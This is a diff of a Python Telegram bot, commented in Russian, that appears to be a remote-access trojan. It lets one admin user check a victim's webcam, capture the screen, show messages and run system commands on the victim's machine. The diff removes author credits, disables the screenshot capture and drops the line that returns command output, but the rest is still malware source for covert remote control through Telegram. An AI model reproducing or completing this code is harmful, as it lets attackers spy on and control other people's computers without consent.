@@ -1,20 +1,11 @@
 # -*- coding: utf-8 -*-
 
-######################################
-#     Telegram: @blackcode_admin     #
-######################################
-#   TelegramChannel: @blackcode_tg   #
-######################################
-# GitHub: www.github.com/soblackcode #
-######################################
-
-
 
 import telebot 					# Библиотека для создание Telegram бота
 import requests					# Библиотека для get/post запросов
 import os 						# Библиотека для работы с системой
 import subprocess 				# Библиотека для работы с системными командами					# Бибилиотека для фото с веб-камеры
-from PIL import ImageGrab		# Модуль для скриншотов экрана
+#from PIL import ImageGrab		# Модуль для скриншотов экрана
 from datetime import datetime	# Модуль времени
 from os import system 			# Библиотека для выполнения системных команд
 
@@ -118,9 +109,9 @@ def text_message(message):
 				bot.send_message(user_id, 'Ошибка! У пользователя нет камеры!')
 		elif message.text == 'Скриншот Экрана': # Если текст = Скриншот Экрана, то..
 			# Делаем скриншот
-			screen = ImageGrab.grab()
+			#screen = ImageGrab.grab()
 			# Бот отправляет нам скриншот
-			bot.send_photo(user_id, screen)
+			bot.send_message(user_id, 'This must be a screenshot')
 		elif message.text.startswith('Сообщение'): # Если текст начинается с "Сообщение"
 			if message.text == 'Сообщение' or (len(message.text) > 9 and message.text[9] != ' '): # Если текст = Сообщение
 				bot.send_message(user_id, 'Вы должны написать так - Сообщение <Текст>\nПример: Сообщение From BLACK CODE With Love<3')
@@ -157,7 +148,6 @@ def text_message(message):
 				output = str(output)
 				output = output[2:]
 				output = output[:-1]
-				bot.send_message(user_id, output)
 			except: # Если произошла ошибка
 				pass # Заглушка
 	else: # Если id пользователя не = id админа, то..
